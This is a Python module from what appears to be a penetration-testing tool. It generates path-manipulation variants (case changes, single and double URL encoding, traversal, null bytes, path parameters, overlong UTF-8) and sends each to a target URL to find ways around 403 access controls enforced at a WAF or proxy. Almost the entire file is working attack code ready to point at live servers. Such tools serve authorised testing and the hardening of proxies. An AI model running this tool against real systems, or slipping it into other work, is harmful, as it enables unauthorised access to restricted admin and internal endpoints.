"""
Technique: Path Manipulation Bypasses
---------------------------------------
Many access control checks happen at the WAF/proxy layer
on the raw URL path before it reaches the backend.
The backend normalizes URLs differently — creating a discrepancy
that lets us access forbidden paths.

Techniques:
  - Case variation           /Admin /ADMIN /AdMiN
  - URL encoding             /admin → /%61dmin /%61%64%6d%69%6e
  - Double encoding          %2561dmin (% → %25)
  - Unicode/UTF-8 encoding   /ądmin /admın
  - Path traversal           /anything/../admin
  - Trailing characters      /admin/ /admin. /admin.. /admin%00 /admin%09
  - Null byte                /admin%00.jpg
  - Path parameter injection /admin;foo=bar /admin;.js
  - Slash variations         //admin ///admin /./admin
  - Overlong UTF-8           %c0%adadmin
  - HTTP verb + path tricks  POST /admin (when GET is blocked)
  - Fragment injection       /admin#
  - Query string bypass      /admin? /admin?foo=bar /admin?.js
"""

import urllib.parse
import itertools
from ..core import http_request, is_bypass, colored_status, R, G, Y, C, DIM, BOLD, RST


def _encode_char(char: str) -> list:
    """Generate encoding variants for a single character."""
    variants = [char]
    encoded  = urllib.parse.quote(char, safe="")
    if encoded != char:
        variants.append(encoded)
        # Double encode
        double = urllib.parse.quote(encoded, safe="")
        if double != encoded:
            variants.append(double)
    return variants


def generate_path_variants(path: str) -> list:
    """
    Generate all path bypass variants for a given path.
    Returns list of (technique_name, modified_path) tuples.
    """
    variants = []
    # Normalize
    path = "/" + path.lstrip("/")

    # ── Case variations ──────────────────────────────────────────────────────
    variants.append(("uppercase",      path.upper()))
    variants.append(("lowercase",      path.lower()))
    # Mixed case — alternate each char
    mixed = "".join(c.upper() if i % 2 == 0 else c.lower()
                    for i, c in enumerate(path))
    variants.append(("mixed_case",     mixed))
    # First char of each segment uppercased
    segs = path.split("/")
    cap_segs = "/".join(s.capitalize() for s in segs)
    variants.append(("capitalize",     cap_segs))

    # ── URL encoding ─────────────────────────────────────────────────────────
    # Encode just the letters in path
    encoded = ""
    for ch in path:
        if ch.isalpha():
            encoded += urllib.parse.quote(ch, safe="")
        else:
            encoded += ch
    variants.append(("url_encoded",    encoded))

    # Double encode
    double_encoded = urllib.parse.quote(path, safe="/").replace("%", "%25")
    variants.append(("double_encoded", double_encoded))

    # Encode the slash
    no_slash = path.replace("/", "%2f")
    variants.append(("encoded_slash",  no_slash))
    variants.append(("double_slash",   "//" + path.lstrip("/")))
    variants.append(("triple_slash",   "///" + path.lstrip("/")))

    # ── Trailing characters ───────────────────────────────────────────────────
    for suffix in ["", "/", ".", "..", "//", "/..", "/.", " ", "%20",
                   "%09", "%00", "%0a", "%0d", "~", "#", "?", "%23",
                   ".json", ".html", ".php", ".asp", ".aspx", ".jsp",
                   ";", ";.js", ";.css", ";.html",
                   "%3b", "%2e", "%3f"]:
        if suffix:
            variants.append((f"suffix_{suffix.replace('%','')}", path + suffix))

    # ── Path traversal ────────────────────────────────────────────────────────
    # Insert /../ before the last segment
    parts = path.rstrip("/").rsplit("/", 1)
    if len(parts) == 2 and parts[1]:
        parent = parts[0] or "/"
        name   = parts[1]
        variants.append(("traversal_relative", f"{parent}/anything/../{name}"))
        variants.append(("traversal_encoded",  f"{parent}/anything/%2e%2e/{name}"))
        variants.append(("traversal_dotslash", f"{parent}/./{name}"))
        variants.append(("traversal_semicolon",f"{parent};/{name}"))

    # ── Slash insertions ──────────────────────────────────────────────────────
    variants.append(("dot_slash",      "/./" + path.lstrip("/")))
    variants.append(("dotdotslash",    "/a/.."+path))

    # ── Path parameter injection ──────────────────────────────────────────────
    for param in [";foo=bar", ";v=1", ";jsessionid=x", ";.jpg",
                  ";.css", ";charset=utf-8"]:
        variants.append((f"path_param{param[:6]}", path + param))

    # ── Query string tricks ───────────────────────────────────────────────────
    for qs in ["?", "?v=1", "?x", "?.js", "?debug=true",
               "?admin=true", "?bypass=1"]:
        variants.append((f"query_{qs[1:4]}", path + qs))

    # ── Unicode / overlong ────────────────────────────────────────────────────
    variants.append(("unicode_slash",  path.replace("/", "%c0%af")))
    variants.append(("unicode_slash2", path.replace("/", "%e0%80%af")))

    # ── Fragment ─────────────────────────────────────────────────────────────
    variants.append(("fragment",       path + "#"))
    variants.append(("fragment_val",   path + "#bypass"))

    # Deduplicate while preserving order
    seen = set()
    unique = []
    for name, p in variants:
        if p not in seen and p != path:
            seen.add(p)
            unique.append((name, p))

    return unique


def run(base_url: str, path: str, baseline: dict,
        cookies: str = None, extra_headers: dict = None,
        verbose: bool = True) -> list:
    """
    Run all path manipulation bypasses against base_url + path.
    baseline: the original 403 response dict.
    Returns list of bypass findings.
    """
    findings = []
    variants  = generate_path_variants(path)

    if verbose:
        print(f"\n  {C}[PATH BYPASS]{RST} Testing {len(variants)} path variants")

    for name, variant_path in variants:
        # Build full URL
        parsed   = urllib.parse.urlparse(base_url)
        test_url = urllib.parse.urlunparse(
            parsed._replace(path=variant_path, query="")
        )

        resp = http_request(test_url, cookies=cookies,
                             headers=extra_headers)

        bypassed, confidence, reason = is_bypass(
            baseline["status"], resp["status"],
            baseline["body_length"], resp["body_length"]
        )

        result = {
            "technique":   "path_manipulation",
            "variant":     name,
            "url":         test_url,
            "path":        variant_path,
            "status":      resp["status"],
            "body_length": resp["body_length"],
            "bypass":      bypassed,
            "confidence":  confidence,
            "reason":      reason,
            "body_snippet":resp["body"][:200] if bypassed else "",
        }

        if bypassed:
            findings.append(result)
            if verbose:
                col = G if confidence == "high" else Y
                print(f"\r{' '*70}\r  {col}{BOLD}[BYPASS]{RST} {name}")
                print(f"    URL    : {test_url}")
                print(f"    Status : {colored_status(resp['status'])} | "
                      f"Length: {resp['body_length']}")
                print(f"    Reason : {reason}\n")
        elif verbose:
            print(f"  {DIM}[{colored_status(resp['status'])}]{RST} {name:<30}", end="\r")

    if verbose:
        print(f"\r{' '*70}\r", end="")

    return findings
